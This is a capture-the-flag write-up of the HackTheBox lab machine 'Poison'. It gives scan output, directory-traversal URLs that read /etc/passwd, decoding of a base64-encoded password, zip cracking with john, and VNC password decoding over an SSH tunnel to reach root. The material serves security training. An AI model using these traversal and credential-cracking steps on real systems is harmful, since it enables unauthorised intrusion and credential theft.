# Hackthebox Poison

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -A -T4 -p- 10.129.177.174      
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 05:36 EST
Nmap scan report for 10.129.177.174
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/2%OT=22%CT=1%CU=31996%PV=Y%DS=2%DC=T%G=Y%TM=61D183AA
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=RI%TS=21)OP
OS:S(O1=M54DNW6ST11%O2=M54DNW6ST11%O3=M280NW6NNT11%O4=M54DNW6ST11%O5=M218NW
OS:6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)EC
OS:N(R=Y%DF=Y%T=40%W=FFFF%O=M54DNW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Directory scanning of the web server

```
$ gobuster dir -u http://10.129.177.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,php               1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.177.174
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/01/02 05:38:23 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 289]
/info.php             (Status: 200) [Size: 157]
/browse.php           (Status: 200) [Size: 321]
/phpinfo.php          (Status: 200) [Size: 68166]
/ini.php              (Status: 200) [Size: 20456]
                                                 
===============================================================
2022/01/02 05:46:32 Finished
===============================================================
```

Two ULRs of importance seem to be / which offers a possibility to submit a script that it executes, and /browse.php for which the script is given as a parameter.

Passing a suggested file listfiles.php reveals existence of pwdbackup.txt that might be of interest

```
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```

Passing pwdbackup.txt to the script

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```


## Vulnerability Scanning

Standard nmap vuln-scan

```
$ sudo nmap --script vuln 10.129.177.174   
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 05:37 EST
Nmap scan report for 10.129.177.174
Host is up (0.035s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.177.174
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.177.174:80/
|     Form id: 
|_    Form action: /browse.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /info.php: Possible information file
|_  /phpinfo.php: Possible information file
| http-sql-injection: 
|   Possible sqli for forms:
|     Form at path: /, form's action: /browse.php. Fields that might be vulnerable:
|_      file
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
```

browse.php seems to be vulnerable for directory traversal, as this parameter for it provides a valid response

```
http://10.129.177.174/browse.php?file=../../../../../usr/local/www/apache24/data/listfiles.php
```

This can be further verified by being able to fetch the /etc/passwd

```
http://10.129.177.174/browse.php?file=../../../../../etc/passwd

# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh 
```

## Initial Access

The 'secure password' is just a base64 encoded many times, and running it through and decoder sufficienly many times reveals the passord

```
Charix!2#4%6&8(0
```

From the /etc/passwd file a probable user 'charix' can be found, and indeed with the password it is possible to ssh in to the host.

```
$ ssh charix@10.129.177.174                                                                                                          130 ⨯
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

...

charix@Poison:~ % ls -al /home/charix/user.txt 
-rw-r-----  1 root  charix  33 Mar 19  2018 /home/charix/user.txt
charix@Poison:~ %
```



## Privilege Escalation

An interesting file secret.zip is found from the home directory of our user. It is password protected, and for simplicity we transfer the to our attacker host.

```
$ scp charix@10.129.177.174:secret.zip . 
Password for charix@Poison:
secret.zip                                                                                                                    100%  166     4.4KB/s   00:00    
                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Poison]
└─$
```

And then bruteforce using john

```
$ zip2john secret.zip > hash.txt
ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827
                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Poison]
└─$ cat hash.txt 
secret.zip/secret:$pkzip2$1*1*2*0*14*8*77537827*0*24*0*14*7753*9827*8061b9caf8436874ad47a9481863b54443379d4c*$/pkzip2$:secret:secret.zip::secret.zip
                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Poison]
└─$ john hash.txt                                              
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
023t0k2a         (secret.zip/secret)
1g 0:00:47:47 DONE 3/3 (2022-01-02 08:21) 0.000348g/s 17502Kp/s 17502Kc/s 17502KC/s 023tsrie..023p4r20
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Poison]
└─$ john --show hash.txt
secret.zip/secret:023t0k2a:secret:secret.zip::secret.zip

1 password hash cracked, 0 left
```

Weird enough the cracked password does not work.

After running the bruteforce decided to try again the ssh-password. I had some copy-paste issues, but finally managed to get it work.

```
$ unzip secret.zip                                                                                                                                      130 ⨯
Archive:  secret.zip
[secret.zip] secret password: 
password incorrect--reenter: 
 extracting: secret                  
```

The purpose of the file is not clear

```
charix@Poison:~ % hexdump secret
0000000 a8bd 7c5b 96d5 217a                    
0000008
```

Now this is something we could combine with the finding of the process list, where a root Xvnc-desktop raises interest

```
charix@Poison:/usr % ps -auxww | grep Xvnc
root     614  0.0  0.9  23620  8868 v0- I    11:36     0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

Vnc passwords are few bytes long, and can be decoded using: https://github.com/jeroennijhof/vncpwd

Indeed, after compiling the source codes

```
$ ./vncpwd ../secret                                                                                     
Password: VNCP@$$!
```

As only the port 22 is open (and not 5901) we need to tunnel the vnc connection over ssh

```
$ ssh -L 5901:localhost:5901 charix@10.129.177.174                                                                                                                        255 ⨯
Password for charix@Poison:
```

After which we can launch on our attacking machine vncviewer. The server address is localhost:5901 as set up the tunnel, and the password is the decrypted one we got from the secret file.

```
root@Poison:~ # uname -a
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
root@Poison:~ # whoami
root
root@Poison:~ # ls -al /root/root.txt
----------  1 root  wheel  33 Jan 24  2018 /root/root.txt
root@Poison:~ # 
```
